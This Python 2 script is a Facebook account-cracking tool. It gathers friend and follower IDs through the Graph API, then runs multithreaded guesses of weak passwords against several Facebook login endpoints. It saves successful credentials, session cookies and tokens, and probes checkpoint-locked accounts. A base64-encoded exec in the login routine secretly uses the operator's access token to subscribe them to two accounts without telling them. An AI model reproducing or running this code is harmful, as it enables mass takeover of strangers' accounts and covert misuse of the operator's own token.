#!/usr/bin/python
# -*- coding: utf-8

#FARIYA KHAN OFFICIAL
#HACKING IS NOT A CRIME, IT'S A PROFESSION TILL THE TIME YOU PLAY WITH IT SAFELY.

import os
try:
	import requests
except ImportError:
	print("\n [!] requests module is not installed")
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	print("\n [!] bs4 module is not installed ")
	os.system("pip2 install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] futures module is not installed")
	os.system("pip2 install futures")

import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

#######COLOUR#######
b='\033[1;94m'                                #
i='\033[1;92m'                                 #
c='\033[1;96m'                                #
m='\033[1;91m'                               #
u='\033[1;95m'                                #
k='\033[1;93m'                                #
p='\033[1;97m'                                #
h='\033[1;92m'                                #
P = '\x1b[1;97m' # WHITE              #
M = '\x1b[1;91m' # RED           #
H = '\x1b[1;92m' # GREEN              #
K = '\x1b[1;93m' # YELLOW           #
B = '\x1b[1;94m' # BLUE               #
U = '\x1b[1;95m' # PURPLE              #
O = '\x1b[1;96m' # LIGHT BLUE     #
N = '\x1b[0m'    # OF COLOUR    #
######COLOUR########

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

def logo():
	os.system("clear")
	ip = requests.get('https://api.ipify.org').text.strip()
	loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
	print("""
\033[1;97m    _________    ____  ____
\033[1;96m   / ____/   |  / __ \/  _/
\033[1;97m  / /_  / /| | / /_/ // /  
\033[1;96m / __/ / ___ |/ _, _// /     \033[1;91m║ Version: 3.0
\033[1;97m/_/   /_/  |_/_/ |_/___/   
\033[1;97m--------------------------------------------------
\033[1;97mAuthor     : Fariya Khan Official.
\033[1;97mFacebook   : m.facebook.com/Faritricker007
\033[1;97mPage       : m.facebook.com/TechFari007
\033[1;97m--------------------------------------------------""")
	print("\t\x1b[1;97m [!] Your IP Address : \x1b[1;92m") + ip
	print("\t\x1b[1;97m [!] Your Country    : \x1b[1;92m") + loc
	print("\033[1;97m--------------------------------------------------")

def main():
	os.system("clear")
	logo()
	print(" \033[1;97m[1] Login With Access-Token")
	print(" \033[1;97m[2] How To Get Access-Token Without Any Problem")
	print(" \033[1;97m[3] Tech Fari Youtube")
	print ' '
	asw = raw_input("\n \033[1;97m[!] Choose : ")
	if asw == "":
		main()
	if asw == "1":
		login()
	if asw == "2":
		gettoken()
	if asw == "3":
		yt()
	else:
		jalan(" \033[1;97m[!] Choose Correct Option ! ")
		main()

def gettoken():
	logo()
	print("\033[0;96m"+50*"-")
	jalan(p+" ["+O+"•"+p+"] Open Youtube...")
	os.system("xdg-open https://youtu.be/LwUYU5RpvbYk")
	raw_input(p+" [BACK]")
	main()
    
def yt():
	logo()
	print("\033[0;96m"+50*"-")
	jalan(p+" ["+O+"•"+p+"] Open Youtube...")
	os.system("xdg-open https://www.youtube.com/channel/UCgzG74c3dNuzBP7hwjWWYYA")
	raw_input(p+" [BACK]")
	main()
	

def login():
	os.system("clear")
	try:
		#-> connection test
		requests.get("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75")
	except requests.exceptions.ConnectionError:
		exit(" [!] No Internet Check Your Internet")
	try:
		token = open("login.txt", "r")
		menu()
	except (KeyError, IOError):
		logo()
		print("")
		print ('\033[1;97m[ login With Access Token ]\n').center(50)
		print("\x1b[1;91m[!] Type help To See How To Get Access Token")
		token = raw_input("\033[1;97m[!] Enter Your Token : \033[0;90m")
		if token == "":
			print("\n \033[1;97m[!] Don't Be Empty")
			login()
		elif token == "help":
			os.system("xdg-open https://youtu.be/LwUYU5RpvbYk")
			raw_input(p+" [BACK]")
			main()
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			import base64
			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDQ1MjAzODU1Mjk0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDMwMTE5MzgwNzIvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCg=="))
			open("login.txt", "w").write(token)
			print("\n\033[1;92m [+] Login With, \033[0;92m%s\033[0;97m"%(nama))
			time.sleep(1)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" [!] Token Expired")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" [!] Token Expired")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
	except IOError:
		os.system("rm -f login.txt")
		exit(" [!] token expired")
	except requests.exceptions.ConnectionError:
		exit(" [!] no internet connection")
	logo()
	print ('\033[1;97mENJOY FREE CLONING').center(50)
	print("\033[1;97m--------------------------------------------------")
	print"\t [ Logged User \033[1;93m"+nama+"\033[1;97m ]"
	print("\033[1;97m--------------------------------------------------")
	print(" \033[1;97m[1] Crack From Public ID")
	print(" \033[1;97m[2] Crack From Followers ID")
	print(" \033[1;97m[3] Crack From Multi Account")
	print(" \033[1;97m[4] See Crack Your Result")
	print(" \033[1;97m[5] Check The Crack Result Option")
	print(" \033[1;97m[6] Manage User-Agent")
	print(" [\033[0;91m0\033[0;97m] Exit (Remove Token)")
	fari = raw_input("\n \033[1;97m[!] Choose Option : ")
	if fari == "":
		menu()
	elif fari == "1":
		publik()
		method()
	elif fari == "2":
		follower()
		method()
	elif fari == "3":
		massal()
		method()
	elif fari == "4":
		os.system("clear")
		logo()
		print("\n \033[1;97m[1] Check the crack OK")
		print(" \033[1;97m[2] Check the crack CP")
		cek = raw_input("\n \033[1;97m[!] Choose : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" \033[1;97m[!] List Of File Names Stored In The OK Folder\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n \033[1;97m[!] Select Filename : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s not available"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" \033[1;97m[#] ----------------------------------------------")
			print(" \033[1;97m[+] crack result : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" \033[1;97m[!] Don't Forget To Copy And Save The Results")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" \033[1;97m[!] List Of File Names Stored In The CP Folder\n")
			for file in dirs:
				print(" \033[1;97m[+] "+file)
			try:
				file = raw_input("\n [!] Select Filename : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s not available"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" \033[1;97m[#] ----------------------------------------------")
			print(" \033[1;97m[+] Crack Result : %s Total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[1;97m [#] ----------------------------------------------")
			exit(" [!] Don't Forget To Copy And Save The Results")
		else:
			menu()
	elif fari == "5":
		cek_opsi()
	elif fari == "6":
		setting_ua()
	elif fari == "0":
		os.system("rm -f login.txt")
		exit("\n \033[1;97m[+] Successfully Deleted Token")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token expired")
	logo()
	print("\n \033[1;97m[!] Fill In 'me' If You Want From Own FriendsList")
	print("")
	idt = raw_input(" \033[1;97m[+] Input ID : \033[1;91m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		print(" \033[1;97m[!] Account Not Available OR Private FriendList")
		menu()
	print(" \033[1;97m[+] Total ID : \033[0;91m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token expired")
	logo()
	print("\n \033[1;97m[!] Fill In 'me' If You Want From Own Followers")
	print("")
	idt = raw_input(" \033[1;97m[+] Input ID : \033[1;91m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		print(" \033[1;97m[!] Account Not Available OR Private Followers")
		menu()
	print(" \033[1;97m[+] Total ID : \033[0;91m%s\033[0;97m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("  \033[1;97m[!] token expired")
	try:
		tanya_total = int(raw_input("  \033[1;97m[+] Enter Number Of Account Crack : "))
	except:tanya_total=1
	logo()
	print("\n  \033[1;97m[!] Fill In 'me' If You Want From Own FriendList")
	for t in range(tanya_total):
		t +=1
		idt = raw_input("  \033[1;97m[+] Target ID %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("\n  \033[1;97m[!] Fill In 'me' If You Want From Own FriendsList")
	print("  \033[1;97m[+] Total id  : \033[0;91m%s\033[0;97m"%(len(id)))

def method():
	print("\033[1;97m--------------------------------------------------")
	print("\t [ Select Crack Method ]")
	print("\033[1;97m--------------------------------------------------")
	print("")
	print(" \033[1;97m[1] Api Method \033[1;91m(Fast Crack)")
	print(" \033[1;97m[2] Free Method \033[1;91m(Fast Crack)")
	print(" \033[1;97m[3] Mbasic Method \033[1;91m(Slow Crack)")
	print(" \033[1;97m[4] Mobile Method \033[1;91m(Slow Crack)")
	method = raw_input("\n \033[1;97m[+] Choose Mehtod : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
		if ask == "y" or ask == "Y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n \033[1;97m[!] Pass Example: 102030,556677,786786")
				asu = raw_input(" \033[1;97m[!] Set Pass : ").split(",")
				if len(asu) =="":
					exit(" \033[1;97m[!] don't be empty")
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, asu)
			exit("\n\n \033[1;97m[#] cracks complete...")
		elif ask == "n" or ask == "N":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				logo()
				print(" [!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"1234", name+"12345", "pakistan", "786786" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"1234", name+"12345", "pakistan", "786786" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345", "pakistan", "786786" ]
					coeg.submit(api, uid, pwx)
			exit("\n\n \033[1;97m[#] cracks complete...")
	elif method == "2":
		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
		if ask == "y" or ask == "Y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n \033[1;97m[!] Pass Example: 102030,556677,786786")
				asu = raw_input(" \033[1;97m[!] Set Pass : ").split(",")
				if len(asu) =="":
					exit(" \033[1;97m[!] don't be empty")
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https:/free.facebook.com")
			exit("\n\n \033[1;97m[#] cracks complete...")
		elif ask == "n" or ask == "N":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://free.facebook.com")
			exit("\n\n \033[1;97m[#] crack complete...")
	elif method == "3":
		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
		if ask == "y" or ask == "Y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n \033[1;97m[!] Pass Example: 102030,556677,786786")
				asu = raw_input(" \033[1;97m[!] Set Pass : ").split(",")
				if len(asu) =="":
					exit(" \033[1;97m[!] don't be empty")
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://mbasic.facebook.com")
			exit("\n\n \033[1;97m[#] crack complete...")
		elif ask == "n" or ask == "N":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
			exit("\n\n \033[1;97m[#] crack complete...")
	elif method == "4":
		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
		if ask == "y" or ask == "Y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n \033[1;97m[!] Pass Example: 102030, 556677, 786786")
				asu = raw_input(" \033[1;97m[!] Set Pass : ").split(",")
				if len(asu) =="":
					exit(" \033[1;97m[!] don't be empty")
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://m.facebook.com")
			exit("\n\n \033[1;97m[#] crack complete...")
		elif ask == "n" or ask == "N":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				logo()
				print(" \033[1;97m[!] If No Result Turn On Aeroplane Mode 5 Seconds\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					else:
						pwx = [ name+"123", name+"1234", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://m.facebook.com")
			exit("\n\n \033[1;97m[#] crack complete...")
		else:
			exit("\n \033[1;97m[!] correct content")
	else:
		menu() 

def api(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r \033[1;97m[*] Crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r  \033[0;92m[FK-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  [FK-OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r  \033[0;93m[FK-CP] %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("  [FK-CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  \033[0;93m[FK-CP] %s|%s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [FK-CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def crack(uid, pwx, host, **kwargs):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r \033[1;97m[*] Crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r  \033[0;92m[FK-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" [FK-OK] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \033[0;93m[FK-CP] %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write("  [FK-CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r  \033[0;93m[FK-CP] %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [FK-CP] %s|%s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")

def setting_ua():
	logo()
	print("\t [ Choose Your Phone User Agent ]")
	print("\033[1;97m--------------------------------------------------\n")
	print(" \033[1;97m[1] Xiaomi")
	print(" \033[1;97m[2] Samsung")
	print(" \033[1;97m[3] Nokia")
	print(" \033[1;97m[4] Asus")
	print(" \033[1;97m[5] Huawei")
	print(" \033[1;97m[6] Motorola")
	print(" \033[1;97m[7] Infinix")
	print(" \033[1;97m[8] Add Own User-Agent")
	ua = raw_input("\n \033[1;97m[!] Choose User-Agent : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "2":
		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "3":
		c_ua = ("Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "4":
		c_ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "5":
		c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "6":
		c_ua = ("Mozilla/5.0 (Linux; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "7":
		c_ua = ("Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.3.1204 Mobile Safari/537.36")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	elif ua == "8":
		logo()
		print("\033[1;91mSearch On Google My User Agent & Copy User Agent And Paste Here\n")
		c_ua = raw_input(" [+] Input User-Agent : ")
		if c_ua == "":
			print("\n \033[1;97m[!] Don't Be Empty")
			menu()
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n \033[1;97m[+] Successfully Changed User Agent")
		menu()
	else:
		menu()

#-> Check Options
def cek_opsi():
	logo()
	print("\n \033[1;97m[!] Input File (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" \033[1;97m[!] Name File  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n \033[1;97m[!] File Name %s not available"%(files))
	print(" \033[1;97m[+] Total Account  : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
	print(" \033[1;97m[!] In The Process Of Checking The Account....")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n \033[1;97m[!] Check Account : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \033[1;97m[!] Account Check Done...")
	raw_input(" \033[1;97m[+] Press Enter To Return To The Menu ")
	time.sleep(1)
	menu()

def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	#-> separator
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" [+] terdapat "+str(len(ngew))+" opsi ")
